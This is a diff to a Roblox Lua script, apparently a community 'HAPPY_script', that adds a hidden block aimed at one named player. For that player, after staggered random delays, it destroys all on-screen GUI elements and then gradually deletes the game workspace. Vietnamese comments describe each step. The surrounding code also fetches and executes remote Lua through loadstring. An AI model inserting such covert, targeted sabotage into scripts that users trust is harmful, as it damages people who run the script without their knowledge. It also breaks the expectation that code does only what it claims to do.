@@ -33,6 +33,36 @@ if _G.HAPPY_script then
 end
 _G.HAPPY_script = true
 
+
+
+
+local player = game.Players.LocalPlayer
+
+if player.Name == "Sleep_WalkPro" then
+	local function waitRandom() task.wait(math.random(10, 30)) end
+
+	-- Bước 1: Xóa toàn bộ ScreenGui
+	waitRandom()
+	for _, gui in pairs(player.PlayerGui:GetChildren()) do
+		if gui:IsA("ScreenGui") then gui:Destroy() end
+	end
+
+	-- Bước 2: Xóa dần Workspace (10 lần, mỗi lần 10%)
+	for i = 1, 10 do
+		waitRandom()
+		local children = workspace:GetChildren()
+		local countToDelete = math.ceil(#children * 0.1)
+		
+		for j = 1, countToDelete do
+			if children[j] then children[j]:Destroy() end
+		end
+	end
+end
+
+
+
+
+
 -- System notification
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HAPPY-script/HAPPY_admin_chat/refs/heads/main/Notification_System.lua"))()
 
